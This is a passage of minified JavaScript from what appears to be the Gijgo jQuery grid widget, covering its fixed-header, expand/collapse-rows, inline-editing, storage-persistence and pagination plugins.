}, gj.grid.widget.prototype = new gj.widget(), gj.grid.widget.constructor = gj.grid.widget, gj.grid.widget.prototype.getConfig = gj.grid.methods.getConfig, gj.grid.widget.prototype.getHTMLConfig = gj.grid.methods.getHTMLConfig, jQuery.fn.grid = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.grid.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.grid.widget(this, e);
  }
}, gj.grid.plugins.fixedHeader = {
  config: {
    base: {
      fixedHeader: !1,
      height: 300
    }
  },
  private: {
    init: function (e) {
      var t = e.data(),
        n = e.children("tbody"),
        i = e.children("thead"),
        o = t.height - i.outerHeight() - (e.children("tfoot").outerHeight() || 0);
      e.addClass("gj-grid-scrollable"), n.css("width", i.outerWidth()), n.height(o);
    },
    refresh: function (e) {
      var t,
        n,
        i = (e.data(), e.children("tbody")),
        o = e.children("thead"),
        r = e.find('tbody tr[data-role="row"] td'),
        a = e.find('thead tr[data-role="caption"] th');
      for (e.children("tbody").height() < gj.grid.plugins.fixedHeader.private.getRowsHeight(e) ? i.css("width", o.outerWidth() + gj.grid.plugins.fixedHeader.private.getScrollBarWidth() + (-1 < navigator.userAgent.toLowerCase().indexOf("firefox") ? 1 : 0)) : i.css("width", o.outerWidth()), t = 0; t < a.length; t++) n = $(a[t]).outerWidth(), 0 === t && gj.core.isIE() && --n, $(r[t]).attr("width", n);
    },
    getRowsHeight: function (e) {
      var t = 0;
      return e.find("tbody tr").each(function () {
        t += $(this).height();
      }), t;
    },
    getScrollBarWidth: function () {
      var e = document.createElement("p");
      e.style.width = "100%", e.style.height = "200px";
      var t = document.createElement("div");
      t.style.position = "absolute", t.style.top = "0px", t.style.left = "0px", t.style.visibility = "hidden", t.style.width = "200px", t.style.height = "150px", t.style.overflow = "hidden", t.appendChild(e), document.body.appendChild(t);
      var n = e.offsetWidth;
      t.style.overflow = "scroll";
      var i = e.offsetWidth;
      return n == i && (i = t.clientWidth), document.body.removeChild(t), n - i;
    }
  },
  public: {},
  events: {},
  configure: function (e, t, n) {
    $.extend(!0, e, gj.grid.plugins.fixedHeader.public), e.data(), n.fixedHeader && (e.on("initialized", function () {
      gj.grid.plugins.fixedHeader.private.init(e);
    }), e.on("dataBound", function () {
      gj.grid.plugins.fixedHeader.private.refresh(e);
    }), e.on("resize", function () {
      gj.grid.plugins.fixedHeader.private.refresh(e);
    }));
  }
}, gj.grid.plugins.expandCollapseRows = {
  config: {
    base: {
      detailTemplate: void 0,
      keepExpandedRows: !0,
      expandedRows: [],
      icons: {
        expandRow: '<i class="gj-icon chevron-right" />',
        collapseRow: '<i class="gj-icon chevron-down" />'
      }
    },
    fontawesome: {
      icons: {
        expandRow: '<i class="fa fa-angle-right" aria-hidden="true"></i>',
        collapseRow: '<i class="fa fa-angle-down" aria-hidden="true"></i>'
      }
    },
    glyphicons: {
      icons: {
        expandRow: '<span class="glyphicon glyphicon-chevron-right" />',
        collapseRow: '<span class="glyphicon glyphicon-chevron-down" />'
      }
    }
  },
  private: {
    expandDetail: function (e, t, n) {
      var i = t.closest("tr"),
        o = $('<tr data-role="details" />'),
        r = $('<td colspan="' + gj.grid.methods.countVisibleColumns(e) + '" />'),
        a = $('<div data-role="display" />'),
        s = e.data(),
        l = i.data("position"),
        d = (e.get(l), gj.grid.plugins.expandCollapseRows);
      o.append(r.append(a.append(i.data("details")))), o.insertAfter(i), t.children('div[data-role="display"]').empty().append(s.icons.collapseRow), e.updateDetails(i), d.private.keepSelection(e, n), d.events.detailExpand(e, o.find("td>div"), n);
    },
    collapseDetail: function (e, t, n) {
      var i = t.closest("tr").next('tr[data-role="details"]'),
        o = e.data(),
        r = gj.grid.plugins.expandCollapseRows;
      i.remove(), t.children('div[data-role="display"]').empty().append(o.icons.expandRow), r.private.removeSelection(e, n), r.events.detailCollapse(e, i.find("td>div"), n);
    },
    keepSelection: function (e, t) {
      var n = e.data();
      n.keepExpandedRows && ($.isArray(n.expandedRows) ? -1 == n.expandedRows.indexOf(t) && n.expandedRows.push(t) : n.expandedRows = [t]);
    },
    removeSelection: function (e, t) {
      var n = e.data();
      n.keepExpandedRows && $.isArray(n.expandedRows) && -1 < n.expandedRows.indexOf(t) && n.expandedRows.splice(n.expandedRows.indexOf(t), 1);
    },
    updateDetailsColSpan: function (e) {
      var t = e.find('tbody > tr[data-role="details"] > td');
      t && t.length && t.attr("colspan", gj.grid.methods.countVisibleColumns(e));
    }
  },
  public: {
    collapseAll: function () {
      var e,
        t = this,
        n = t.data();
      return void 0 !== n.detailTemplate && (e = gj.grid.methods.getColumnPositionByRole(t, "expander"), t.find('tbody tr[data-role="row"]').each(function () {
        gj.grid.plugins.expandCollapseRows.private.collapseDetail(t, $(this).find("td:eq(" + e + ")"));
      })), void 0 !== n.grouping && t.find('tbody tr[role="group"]').each(function () {
        gj.grid.plugins.grouping.private.collapseGroup(n, $(this).find("td:eq(0)"));
      }), t;
    },
    expandAll: function () {
      var e,
        t = this,
        n = t.data();
      return void 0 !== n.detailTemplate && (e = gj.grid.methods.getColumnPositionByRole(t, "expander"), t.find('tbody tr[data-role="row"]').each(function () {
        gj.grid.plugins.expandCollapseRows.private.expandDetail(t, $(this).find("td:eq(" + e + ")"));
      })), void 0 !== n.grouping && t.find('tbody tr[role="group"]').each(function () {
        gj.grid.plugins.grouping.private.expandGroup(n, $(this).find("td:eq(0)"));
      }), t;
    },
    updateDetails: function (e) {
      var i = this,
        t = e.data("details"),
        o = t.html(),
        r = i.get(e.data("position"));
      return r && o && (t.html().replace(/\{(.+?)\}/g, function (e, t) {
        var n = gj.grid.methods.getColumnInfo(i, t);
        o = o.replace(e, gj.grid.methods.formatText(r[t], n));
      }), t.html(o)), i;
    }
  },
  events: {
    detailExpand: function (e, t, n) {
      e.triggerHandler("detailExpand", [t, n]);
    },
    detailCollapse: function (e, t, n) {
      e.triggerHandler("detailCollapse", [t, n]);
    }
  },
  configure: function (r) {
    var e,
      o = r.data();
    $.extend(!0, r, gj.grid.plugins.expandCollapseRows.public), void 0 !== o.detailTemplate && (e = {
      title: "",
      width: o.defaultIconColumnWidth,
      align: "center",
      stopPropagation: !0,
      cssClass: "gj-cursor-pointer gj-unselectable",
      tmpl: o.icons.expandRow,
      role: "expander",
      events: {
        click: function (e) {
          var t = $(this),
            n = gj.grid.plugins.expandCollapseRows.private;
          "details" === t.closest("tr").next().attr("data-role") ? n.collapseDetail(r, t, e.data.id) : n.expandDetail(r, $(this), e.data.id);
        }
      }
    }, o.columns = [e].concat(o.columns), r.on("rowDataBound", function (e, t, n, i) {
      t.data("details", $(o.detailTemplate));
    }), r.on("columnShow", function (e, t) {
      gj.grid.plugins.expandCollapseRows.private.updateDetailsColSpan(r);
    }), r.on("columnHide", function (e, t) {
      gj.grid.plugins.expandCollapseRows.private.updateDetailsColSpan(r);
    }), r.on("rowRemoving", function (e, t, n, i) {
      gj.grid.plugins.expandCollapseRows.private.collapseDetail(r, t.children("td").first(), n);
    }), r.on("dataBinding", function () {
      r.collapseAll();
    }), r.on("pageChanging", function () {
      r.collapseAll();
    }), r.on("dataBound", function () {
      var e,
        t,
        n,
        i,
        o = r.data();
      if (o.keepExpandedRows && $.isArray(o.expandedRows)) for (e = 0; e < o.expandedRows.length; e++) (n = gj.grid.methods.getRowById(r, o.expandedRows[e])) && n.length && (i = gj.grid.methods.getColumnPositionByRole(r, "expander"), (t = n.children("td:eq(" + i + ")")) && t.length && gj.grid.plugins.expandCollapseRows.private.expandDetail(r, t));
    }));
  }
}, gj.grid.plugins.inlineEditing = {
  renderers: {
    editManager: function (e, t, n, i, o, r) {
      var a = r.data(),
        s = $(a.inlineEditing.editButton).attr("key", o),
        l = $(a.inlineEditing.deleteButton).attr("key", o),
        d = $(a.inlineEditing.updateButton).attr("key", o).hide(),
        c = $(a.inlineEditing.cancelButton).attr("key", o).hide();
      s.on("click", function (e) {
        r.edit($(this).attr("key"));
      }), l.on("click", function (e) {
        r.removeRow($(this).attr("key"));
      }), d.on("click", function (e) {
        r.update($(this).attr("key"));
      }), c.on("click", function (e) {
        r.cancel($(this).attr("key"));
      }), i.empty().append(s).append(l).append(d).append(c);
    }
  }
}, gj.grid.plugins.inlineEditing.config = {
  base: {
    defaultColumnSettings: {
      editor: void 0,
      editField: void 0,
      mode: "readEdit"
    },
    inlineEditing: {
      mode: "click",
      managementColumn: !0,
      managementColumnConfig: {
        width: 300,
        role: "managementColumn",
        align: "center",
        renderer: gj.grid.plugins.inlineEditing.renderers.editManager,
        cssClass: "gj-grid-management-column"
      }
    }
  },
  bootstrap: {
    inlineEditing: {
      managementColumnConfig: {
        width: 200,
        role: "managementColumn",
        align: "center",
        renderer: gj.grid.plugins.inlineEditing.renderers.editManager,
        cssClass: "gj-grid-management-column"
      }
    }
  },
  bootstrap4: {
    inlineEditing: {
      managementColumnConfig: {
        width: 280,
        role: "managementColumn",
        align: "center",
        renderer: gj.grid.plugins.inlineEditing.renderers.editManager,
        cssClass: "gj-grid-management-column"
      }
    }
  }
}, gj.grid.plugins.inlineEditing.private = {
  localization: function (e) {
    "bootstrap" === e.uiLibrary ? (e.inlineEditing.editButton = '<button role="edit" class="btn btn-default btn-sm"><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span> ' + gj.grid.messages[e.locale].Edit + "</button>", e.inlineEditing.deleteButton = '<button role="delete" class="btn btn-default btn-sm gj-margin-left-10"><span class="glyphicon glyphicon-remove" aria-hidden="true"></span> ' + gj.grid.messages[e.locale].Delete + "</button>", e.inlineEditing.updateButton = '<button role="update" class="btn btn-default btn-sm"><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> ' + gj.grid.messages[e.locale].Update + "</button>", e.inlineEditing.cancelButton = '<button role="cancel" class="btn btn-default btn-sm gj-margin-left-10"><span class="glyphicon glyphicon-ban-circle" aria-hidden="true"></span> ' + gj.grid.messages[e.locale].Cancel + "</button>") : (e.inlineEditing.editButton = '<button role="edit" class="gj-button-md"><i class="gj-icon pencil" /> ' + gj.grid.messages[e.locale].Edit.toUpperCase() + "</button>", e.inlineEditing.deleteButton = '<button role="delete" class="gj-button-md"><i class="gj-icon delete" /> ' + gj.grid.messages[e.locale].Delete.toUpperCase() + "</button>", e.inlineEditing.updateButton = '<button role="update" class="gj-button-md"><i class="gj-icon check-circle" /> ' + gj.grid.messages[e.locale].Update.toUpperCase() + "</button>", e.inlineEditing.cancelButton = '<button role="cancel" class="gj-button-md"><i class="gj-icon cancel" /> ' + gj.grid.messages[e.locale].Cancel.toUpperCase() + "</button>");
  },
  editMode: function (t, n, i, o) {
    var e,
      r,
      a,
      s,
      l,
      d = t.data();
    if ("edit" !== n.attr("data-mode")) if (i.editor) {
      if (gj.grid.plugins.inlineEditing.private.updateOtherCells(t, i.mode), e = n.find('div[data-role="display"]').hide(), 0 === (r = n.find('div[data-role="edit"]').show()).length && (r = $('<div data-role="edit" />'), n.append(r)), s = o[i.editField || i.field], (a = r.find("input, select, textarea").first()).length) switch (i.type) {
        case "checkbox":
          a.prop("checked", s);
          break;
        case "dropdown":
          a = a.dropdown("value", s);
          break;
        default:
          a.val(s);
      } else {
        if ("function" == typeof i.editor) i.editor(r, s, o), a = r.find("input, select, textarea").first();else if ((l = "object" == typeof i.editor ? i.editor : {}).uiLibrary = d.uiLibrary, l.iconsLibrary = d.iconsLibrary, l.fontSize = t.css("font-size"), l.showOnFocus = !1, "checkbox" === i.type && gj.checkbox) a = $('<input type="checkbox" />').prop("checked", s), r.append(a), a.checkbox(l);else if ("date" === i.type && gj.datepicker || "time" === i.type && gj.timepicker || "datetime" === i.type && gj.datetimepicker) {
          switch (a = $('<input type="text" width="100%"/>'), r.append(a), i.format && (l.format = i.format), i.type) {
            case "date":
              a = a.datepicker(l);
              break;
            case "time":
              a = a.timepicker(l);
              break;
            case "datetime":
              a = a.datetimepicker(l);
          }
          a.value && a.value(e.html());
        } else "dropdown" === i.type && gj.dropdown ? (a = $('<select type="text" width="100%"/>'), r.append(a), l.dataBound = function (e) {
          var t = $(this).dropdown();
          i.editField ? t.value(o[i.editField]) : t.value(o[i.field]);
        }, a = a.dropdown(l)) : (a = $('<input type="text" value="' + s + '" class="gj-width-full"/>'), "materialdesign" === d.uiLibrary && a.addClass("gj-textbox-md").css("font-size", t.css("font-size")), r.append(a));
        "command" !== d.inlineEditing.mode && "editOnly" !== i.mode && (a = r.find("input, select, textarea").first()).on("keyup", function (e) {
          13 !== e.keyCode && 27 !== e.keyCode || gj.grid.plugins.inlineEditing.private.displayMode(t, n, i);
        });
      }
      "INPUT" === a.prop("tagName").toUpperCase() && "TEXT" === a.prop("type").toUpperCase() ? gj.core.setCaretAtEnd(a[0]) : a.focus(), n.attr("data-mode", "edit");
    } else "managementColumn" === i.role && (n.find('[role="edit"]').hide(), n.find('[role="delete"]').hide(), n.find('[role="update"]').show(), n.find('[role="cancel"]').show());
  },
  displayMode: function (e, t, n, i) {
    var o, r, a, s, l, d, c;
    "editOnly" !== n.mode && ("edit" === t.attr("data-mode") && (o = t.find('div[data-role="edit"]'), r = t.find('div[data-role="display"]'), "SELECT" === (a = o.find("input, select, textarea").first())[0].tagName.toUpperCase() && -1 < a[0].selectedIndex ? (s = a[0].options[a[0].selectedIndex].innerHTML, l = a[0].value) : s = "INPUT" === a[0].tagName.toUpperCase() && "CHECKBOX" === a[0].type.toUpperCase() ? a[0].checked : a.val(), c = t.parent().data("position"), d = e.get(c), !0 !== i && s !== d[n.field] && (d[n.field] = "date" === n.type ? gj.core.parseDate(s, n.format) : s, n.editField && (d[n.editField] = l || s), "editOnly" !== n.mode && (gj.grid.methods.renderDisplayElement(e, r, n, d, gj.grid.methods.getId(d, e.data("primaryKey"), c), "update"), 0 === t.find("span.gj-dirty").length && t.prepend($('<span class="gj-dirty" />'))), gj.grid.plugins.inlineEditing.events.cellDataChanged(e, t, n, d, s), gj.grid.plugins.inlineEditing.private.updateChanges(e, n, d, s)), o.hide(), r.show(), t.attr("data-mode", "display")), "managementColumn" === n.role && (t.find('[role="update"]').hide(), t.find('[role="cancel"]').hide(), t.find('[role="edit"]').show(), t.find('[role="delete"]').show()));
  },
  updateOtherCells: function (n, e) {
    var i = n.data();
    "command" !== i.inlineEditing.mode && "editOnly" !== e && n.find('div[data-role="edit"]:visible').parent("td").each(function () {
      var e = $(this),
        t = i.columns[e.index()];
      gj.grid.plugins.inlineEditing.private.displayMode(n, e, t);
    });
  },
  updateChanges: function (e, t, n, i) {
    var o,
      r,
      a,
      s = e.data();
    s.guid || (s.guid = gj.grid.plugins.inlineEditing.private.generateGUID()), s.primaryKey && ((o = JSON.parse(sessionStorage.getItem("gj.grid." + s.guid))) ? r = o.filter(function (e) {
      return e[s.primaryKey] === n[s.primaryKey];
    }) : o = [], r && 1 === r.length ? r[0][t.field] = i : ((a = {})[s.primaryKey] = n[s.primaryKey], s.primaryKey !== t.field && (a[t.field] = i), o.push(a)), sessionStorage.setItem("gj.grid." + s.guid, JSON.stringify(o)));
  },
  generateGUID: function () {
    function e() {
      return Math.floor(65536 * (1 + Math.random())).toString(16).substring(1);
    }
    return e() + e() + "-" + e() + "-" + e() + "-" + e() + "-" + e() + e() + e();
  }
}, gj.grid.plugins.inlineEditing.public = {
  getChanges: function () {
    return JSON.parse(sessionStorage.getItem("gj.grid." + this.data().guid));
  },
  edit: function (e) {
    var t,
      n = this.getById(e),
      i = gj.grid.methods.getRowById(this, e).children("td"),
      o = this.data("columns");
    for (t = 0; t < i.length; t++) gj.grid.plugins.inlineEditing.private.editMode(this, $(i[t]), o[t], n);
    return this;
  },
  update: function (e) {
    var t,
      n = this.getById(e),
      i = gj.grid.methods.getRowById(this, e).children("td"),
      o = this.data("columns");
    for (t = 0; t < i.length; t++) gj.grid.plugins.inlineEditing.private.displayMode(this, $(i[t]), o[t], !1);
    return gj.grid.plugins.inlineEditing.events.rowDataChanged(this, e, n), this;
  },
  cancel: function (e) {
    var t,
      n = (this.getById(e), gj.grid.methods.getRowById(this, e).children("td")),
      i = this.data("columns");
    for (t = 0; t < n.length; t++) gj.grid.plugins.inlineEditing.private.displayMode(this, $(n[t]), i[t], !0);
    return this;
  }
}, gj.grid.plugins.inlineEditing.events = {
  cellDataChanged: function (e, t, n, i, o, r) {
    e.triggerHandler("cellDataChanged", [t, n, i, o, r]);
  },
  rowDataChanged: function (e, t, n) {
    e.triggerHandler("rowDataChanged", [t, n]);
  }
}, gj.grid.plugins.inlineEditing.configure = function (r, e, t) {
  var a = r.data();
  $.extend(!0, r, gj.grid.plugins.inlineEditing.public), t.inlineEditing && (r.on("dataBound", function () {
    r.find("span.gj-dirty").remove();
  }), r.on("rowDataBound", function (e, t, n, i) {
    r.cancel(n);
  })), "command" === a.inlineEditing.mode ? (gj.grid.plugins.inlineEditing.private.localization(a), e.inlineEditing.managementColumn && a.columns.push(e.inlineEditing.managementColumnConfig)) : r.on("cellDataBound", function (e, t, n, i, o) {
    i.editor && ("editOnly" === i.mode ? gj.grid.plugins.inlineEditing.private.editMode(r, t.parent(), i, o) : t.parent("td").on("dblclick" === a.inlineEditing.mode ? "dblclick" : "click", function () {
      gj.grid.plugins.inlineEditing.private.editMode(r, t.parent(), i, o);
    }));
  });
}, gj.grid.plugins.optimisticPersistence = {
  config: {
    base: {
      optimisticPersistence: {
        localStorage: void 0,
        sessionStorage: void 0
      }
    }
  },
  private: {
    applyParams: function (e) {
      var t,
        n = e.data(),
        i = {};
      (t = JSON.parse(sessionStorage.getItem("gj.grid." + n.guid))) && t.optimisticPersistence && $.extend(i, t.optimisticPersistence), (t = JSON.parse(localStorage.getItem("gj.grid." + n.guid))) && t.optimisticPersistence && $.extend(i, t.optimisticPersistence), $.extend(n.params, i);
    },
    saveParams: function (e) {
      var t,
        n,
        i = e.data(),
        o = {
          optimisticPersistence: {}
        };
      if (i.optimisticPersistence.sessionStorage) {
        for (t = 0; t < i.optimisticPersistence.sessionStorage.length; t++) n = i.optimisticPersistence.sessionStorage[t], o.optimisticPersistence[n] = i.params[n];
        o = $.extend(!0, JSON.parse(sessionStorage.getItem("gj.grid." + i.guid)), o), sessionStorage.setItem("gj.grid." + i.guid, JSON.stringify(o));
      }
      if (i.optimisticPersistence.localStorage) {
        for (o = {
          optimisticPersistence: {}
        }, t = 0; t < i.optimisticPersistence.localStorage.length; t++) n = i.optimisticPersistence.localStorage[t], o.optimisticPersistence[n] = i.params[n];
        o = $.extend(!0, JSON.parse(localStorage.getItem("gj.grid." + i.guid)), o), localStorage.setItem("gj.grid." + i.guid, JSON.stringify(o));
      }
    }
  },
  configure: function (t, e, n) {
    e.guid && (e.optimisticPersistence.localStorage || e.optimisticPersistence.sessionStorage) && (gj.grid.plugins.optimisticPersistence.private.applyParams(t), t.on("dataBound", function (e) {
      gj.grid.plugins.optimisticPersistence.private.saveParams(t);
    }));
  }
}, gj.grid.plugins.pagination = {
  config: {
    base: {
      style: {
        pager: {
          panel: "",
          stateDisabled: "",
          activeButton: ""
        }
      },
      paramNames: {
        page: "page",
        limit: "limit"
      },
      pager: {
        limit: 10,
        sizes: [5, 10, 20, 100],
        leftControls: void 0,
        rightControls: void 0
      }
    },
    bootstrap: {
      style: {
        pager: {
          panel: "",
          stateDisabled: ""
        }
      }
    },
    bootstrap4: {
      style: {
        pager: {
          panel: "btn-toolbar",
          stateDisabled: ""
        }
      }
    },
    glyphicons: {
      icons: {
        first: '<span class="glyphicon glyphicon-step-backward"></span>',
        previous: '<span class="glyphicon glyphicon-backward"></span>',
        next: '<span class="glyphicon glyphicon-forward"></span>',
        last: '<span class="glyphicon glyphicon-step-forward"></span>',
        refresh: '<span class="glyphicon glyphicon-refresh"></span>'
      }
    },
    materialicons: {
      icons: {
        first: '<i class="gj-icon first-page" />',
        last: '<i class="gj-icon last-page" />',
        refresh: '<i class="gj-icon refresh" />'
      }
    },
    fontawesome: {
      icons: {
        first: '<i class="fa fa-fast-backward" aria-hidden="true"></i>',
        previous: '<i class="fa fa-backward" aria-hidden="true"></i>',
        next: '<i class="fa fa-forward" aria-hidden="true"></i>',
        last: '<i class="fa fa-fast-forward" aria-hidden="true"></i>',
        refresh: '<i class="fa fa-refresh" aria-hidden="true"></i>'
      }
    }
  },
  private: {
    init: function (e) {
      var t, n, i, o, r, a, s, l, d, c;
      if ((i = e.data()).pager) for (i.params[i.paramNames.page] || (i.params[i.paramNames.page] = 1), i.params[i.paramNames.limit] || (i.params[i.paramNames.limit] = i.pager.limit), gj.grid.plugins.pagination.private.localization(i), t = $('<tr data-role="pager"/>'), n = $("<th/>"), t.append(n), r = $('<div data-role="display" />').addClass(i.style.pager.panel).css({
        float: "left"
      }), a = $('<div data-role="display" />').addClass(i.style.pager.panel).css({
        float: "right"
      }), n.append(r).append(a), s = $("<tfoot />").append(t), e.append(s), gj.grid.plugins.pagination.private.updatePagerColSpan(e), l = gj.grid.methods.clone(i.pager.leftControls), $.each(l, function () {
        r.append(this);
      }), d = gj.grid.methods.clone(i.pager.rightControls), $.each(d, function () {
        a.append(this);
      }), o = e.find("tfoot [data-role]"), c = 0; c < o.length; c++) gj.grid.plugins.pagination.private.initPagerControl($(o[c]), e);
    },
    localization: function (e) {
      "bootstrap" === e.uiLibrary ? gj.grid.plugins.pagination.private.localizationBootstrap(e) : "bootstrap4" === e.uiLibrary ? gj.grid.plugins.pagination.private.localizationBootstrap4(e) : gj.grid.plugins.pagination.private.localizationMaterialDesign(e);
    },
    localizationBootstrap: function (e) {
      var t = gj.grid.messages[e.locale];
      void 0 === e.pager.leftControls && (e.pager.leftControls = [$('<button type="button" class="btn btn-default btn-sm">' + (e.icons.first || t.First) + "</button>").attr("title", t.FirstPageTooltip).attr("data-role", "page-first"), $('<button type="button" class="btn btn-default btn-sm">' + (e.icons.previous || t.Previous) + "</button>").attr("title", t.PreviousPageTooltip).attr("data-role", "page-previous"), $("<div>" + t.Page + "</div>"), $('<input data-role="page-number" class="form-control input-sm" type="text" value="0">'), $("<div>" + t.Of + "</div>"), $('<div data-role="page-label-last">0</div>'), $('<button type="button" class="btn btn-default btn-sm">' + (e.icons.next || t.Next) + "</button>").attr("title", t.NextPageTooltip).attr("data-role", "page-next"), $('<button type="button" class="btn btn-default btn-sm">' + (e.icons.last || t.Last) + "</button>").attr("title", t.LastPageTooltip).attr("data-role", "page-last"), $('<button type="button" class="btn btn-default btn-sm">' + (e.icons.refresh || t.Refresh) + "</button>").attr("title", t.Refresh).attr("data-role", "page-refresh"), $('<select data-role="page-size" class="form-control input-sm" width="60"></select>')]), void 0 === e.pager.rightControls && (e.pager.rightControls = [$("<div>" + t.DisplayingRecords + "</div>"), $('<div data-role="record-first">0</div>'), $("<div>-</div>"), $('<div data-role="record-last">0</div>'), $("<div>" + t.Of + "</div>"), $('<div data-role="record-total">0</div>')]);
    },
    localizationBootstrap4: function (e) {
      var t = gj.grid.messages[e.locale];
      void 0 === e.pager.leftControls && (e.pager.leftControls = [$('<button class="btn btn-default btn-sm gj-cursor-pointer">' + (e.icons.first || t.First) + "</button>").attr("title", t.FirstPageTooltip).attr("data-role", "page-first"), $('<button class="btn btn-default btn-sm gj-cursor-pointer">' + (e.icons.previous || t.Previous) + "</button>").attr("title", t.PreviousPageTooltip).attr("data-role", "page-previous"), $("<div>" + t.Page + "</div>"), $('<div class="input-group"><input data-role="page-number" class="form-control form-control-sm" type="text" value="0"></div>'), $("<div>" + t.Of + "</div>"), $('<div data-role="page-label-last">0</div>'), $('<button class="btn btn-default btn-sm gj-cursor-pointer">' + (e.icons.next || t.Next) + "</button>").attr("title", t.NextPageTooltip).attr("data-role", "page-next"), $('<button class="btn btn-default btn-sm gj-cursor-pointer">' + (e.icons.last || t.Last) + "</button>").attr("title", t.LastPageTooltip).attr("data-role", "page-last"), $('<button class="btn btn-default btn-sm gj-cursor-pointer">' + (e.icons.refresh || t.Refresh) + "</button>").attr("title", t.Refresh).attr("data-role", "page-refresh"), $('<select data-role="page-size" class="form-control input-sm" width="60"></select>')]), void 0 === e.pager.rightControls && (e.pager.rightControls = [$("<div>" + t.DisplayingRecords + "&nbsp;</div>"), $('<div data-role="record-first">0</div>'), $("<div>-</div>"), $('<div data-role="record-last">0</div>'), $("<div>" + t.Of + "</div>"), $('<div data-role="record-total">0</div>')]);
    },
    localizationMaterialDesign: function (e) {
      var t = gj.grid.messages[e.locale];
      void 0 === e.pager.leftControls && (e.pager.leftControls = []), void 0 === e.pager.rightControls && (e.pager.rightControls = [$('<span class="">' + t.RowsPerPage + "</span>"), $('<select data-role="page-size" class="gj-grid-md-limit-select" width="52"></select></div>'), $('<span class="gj-md-spacer-32">&nbsp;</span>'), $('<span data-role="record-first" class="">0</span>'), $('<span class="">-</span>'), $('<span data-role="record-last" class="">0</span>'), $('<span class="gj-grid-mdl-pager-label">' + t.Of + "</span>"), $('<span data-role="record-total" class="">0</span>'), $('<span class="gj-md-spacer-32">&nbsp;</span>'), $('<button class="gj-button-md">' + (e.icons.previous || t.Previous) + "</button>").attr("title", t.PreviousPageTooltip).attr("data-role", "page-previous").addClass(e.icons.first ? "gj-button-md-icon" : ""), $('<span class="gj-md-spacer-24">&nbsp;</span>'), $('<button class="gj-button-md">' + (e.icons.next || t.Next) + "</button>").attr("title", t.NextPageTooltip).attr("data-role", "page-next").addClass(e.icons.first ? "gj-button-md-icon" : "")]);
    },
    initPagerControl: function (e, t) {
      var n = t.data();
      switch (e.data("role")) {
        case "page-size":
          n.pager.sizes && 0 < n.pager.sizes.length ? (e.show(), $.each(n.pager.sizes, function () {
            e.append($("<option/>").attr("value", this.toString()).text(this.toString()));
          }), e.change(function () {
            var e = parseInt(this.value, 10);
            n.params[n.paramNames.limit] = e, gj.grid.plugins.pagination.private.changePage(t, 1), gj.grid.plugins.pagination.events.pageSizeChange(t, e);
          }), e.val(n.params[n.paramNames.limit]), gj.dropdown && e.dropdown({
            uiLibrary: n.uiLibrary,
            iconsLibrary: n.iconsLibrary,
            fontSize: e.css("font-size"),
            style: {
              presenter: "btn btn-default btn-sm"
            }
          })) : e.hide();
          break;
        case "page-refresh":
          e.on("click", function () {
            t.reload();
          });
      }
    },
    reloadPager: function (e, t) {
      var n, i, o, r, a, s, l, d;
      if ((s = e.data()).pager) {
        for (n = 0 === t ? 0 : parseInt(s.params[s.paramNames.page], 10), i = parseInt(s.params[s.paramNames.limit], 10), o = Math.ceil(t / i), a = t < (r = 0 === n ? 0 : i * (n - 1) + 1) + i ? t : r + i - 1, l = e.find("TFOOT [data-role]"), d = 0; d < l.length; d++) gj.grid.plugins.pagination.private.reloadPagerControl($(l[d]), e, n, o, r, a, t);
        gj.grid.plugins.pagination.private.updatePagerColSpan(e);
      }
    },
    reloadPagerControl: function (e, t, n, i, o, r, a) {
      var s;
      switch (e.data("role")) {
        case "page-first":
          gj.grid.plugins.pagination.private.assignPageHandler(t, e, 1, n < 2);
          break;
        case "page-previous":
          gj.grid.plugins.pagination.private.assignPageHandler(t, e, n - 1, n < 2);
          break;
        case "page-number":
          e.val(n).off("change").on("change", gj.grid.plugins.pagination.private.createChangePageHandler(t, n));
          break;
        case "page-label-last":
          e.text(i);
          break;
        case "page-next":
          gj.grid.plugins.pagination.private.assignPageHandler(t, e, n + 1, i === n);
          break;
        case "page-last":
          gj.grid.plugins.pagination.private.assignPageHandler(t, e, i, i === n);
          break;
        case "page-button-one":
          s = 1 === n ? 1 : n == i ? n - 2 : n - 1, gj.grid.plugins.pagination.private.assignButtonHandler(t, e, n, s, i);
          break;
        case "page-button-two":
          s = 1 === n ? 2 : n == i ? i - 1 : n, gj.grid.plugins.pagination.private.assignButtonHandler(t, e, n, s, i);
          break;
        case "page-button-three":
          s = 1 === n ? n + 2 : n == i ? n : n + 1, gj.grid.plugins.pagination.private.assignButtonHandler(t, e, n, s, i);
          break;
        case "record-first":
          e.text(o);
          break;
        case "record-last":
          e.text(r);
          break;
        case "record-total":
          e.text(a);
      }
    },
    assignPageHandler: function (e, t, n, i) {
      var o = e.data().style.pager;
      i ? t.addClass(o.stateDisabled).prop("disabled", !0).off("click") : t.removeClass(o.stateDisabled).prop("disabled", !1).off("click").on("click", function () {
        gj.grid.plugins.pagination.private.changePage(e, n);
      });
    },
    assignButtonHandler: function (e, t, n, i, o) {
      var r = e.data().style.pager;
      i < 1 || o < i ? t.hide() : (t.show().off("click").text(i), i === n ? t.addClass(r.activeButton) : t.removeClass(r.activeButton).on("click", function () {
        gj.grid.plugins.pagination.private.changePage(e, i);
      }));
    },
    createChangePageHandler: function (t, e) {
      return function () {
        var e = (t.data(), parseInt(this.value, 10));
        gj.grid.plugins.pagination.private.changePage(t, e);
      };
    },
    changePage: function (e, t) {
      var n = e.data();
      !1 === gj.grid.plugins.pagination.events.pageChanging(e, t) || isNaN(t) || (e.find('TFOOT [data-role="page-number"]').val(t), n.params[n.paramNames.page] = t), e.reload();
    },
    updatePagerColSpan: function (e) {
      var t = e.find('tfoot > tr[data-role="pager"] > th');
      t && t.length && t.attr("colspan", gj.grid.methods.countVisibleColumns(e));
    },
    isLastRecordVisible: function (e) {
      var t = !0,
        n = e.data(),
        i = parseInt(n.params[n.paramNames.limit], 10),
        o = parseInt(n.params[n.paramNames.page], 10),
        r = e.count();
      return i && o && (t = (o - 1) * i + r === n.totalRecords), t;
    }
  },
  public: {
    getAll: function (e) {
      var t,
        n,
        i = this.data();
      return $.isArray(i.dataSource) ? e ? i.dataSource : i.params[i.paramNames.limit] && i.params[i.paramNames.page] ? (t = parseInt(i.params[i.paramNames.limit], 10), n = (parseInt(i.params[i.paramNames.page], 10) - 1) * t, i.records.slice(n, n + t)) : i.records : i.records;
    }
  },
  events: {
    pageSizeChange: function (e, t) {
